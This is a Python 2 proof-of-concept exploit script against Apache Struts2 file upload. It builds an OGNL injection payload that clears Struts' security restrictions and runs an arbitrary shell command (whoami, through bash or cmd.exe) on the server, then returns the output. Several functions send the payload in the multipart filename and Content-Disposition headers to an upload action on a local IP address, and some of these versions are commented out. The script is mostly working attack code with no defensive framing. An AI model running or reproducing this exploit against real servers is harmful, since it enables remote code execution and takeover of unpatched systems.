#! /usr/bin/env python
# encoding:utf-8
import urllib2
import sys,json
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

cmd = "whoami"
boundary="------WebKitFormBoundaryXd004BVJN9pBYBL2"
payload="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"


# def poc():
#     register_openers()
#     cmd = "whoami"
#     datagen, header = multipart_encode({"image1": ''})
#     header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
#     #header["Content-Length"]="1000000000"
#     header["Content-Type"]="multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2"
#     header["Content-Disposition"]="""Content-Disposition: form-data; name="upload"; filename="%s\\0b" """ % payload
#     header["Connection"] = "close"
#     request = urllib2.Request("http://192.168.1.128:8080/Struts2FileUpload/doUpload.action",datagen,headers=header)
#     response = urllib2.urlopen(request)
#     html = response.read()
#     try:
#         html = html.decode("gbk").encode("utf-8")
#     except:
#         pass
#     print html
#
# poc()

def poc2():
    headers = {
    'Host': '192.168.1.128:8080',
    #'Content-Length': '1000000000',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2',
    #'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    #'Referer': 'http://192.168.1.128:8080/Struts2FileUpload/doUpload.action',
    #'Accept-Language': 'en-US,en;q=0.8,es;q=0.6',
    'Connection': 'close',
    }
    cmd = "whoami"
    boundary="------WebKitFormBoundaryXd004BVJN9pBYBL2"
    payload="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    payload1 = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"

    data = "--%s\r\nContent-Disposition: form-data; name=foo; filename=%s\\0b\r\nContent-Type: text/plain\r\n\r\nx\r\n--%s--\r\n\r\n" % (boundary,payload,boundary)

    print data
    req=urllib2.Request('http://192.168.1.128:8080/Struts2FileUpload/doUpload.action',data = data,headers=headers)
    res=urllib2.urlopen(req,timeout=10)
    html = res.read()
    try:
        html = html.decode("gbk").encode("utf-8")
    except:
        pass
    print html
#poc2()

def poc3():
    headers = {
    'Host': '192.168.1.128:8080',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2',
    'Content-Length': '100',
    'Connection': 'close'
    }
    #data="-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n"
    data = "1"
    req=urllib2.Request('http://192.168.1.128:8080/Struts2FileUpload/doUpload.action',data = data,headers=headers)
    res=urllib2.urlopen(req)
    html = res.read()
    try:
        html = html.decode("gbk").encode("utf-8")
    except:
        pass
    print html
poc3()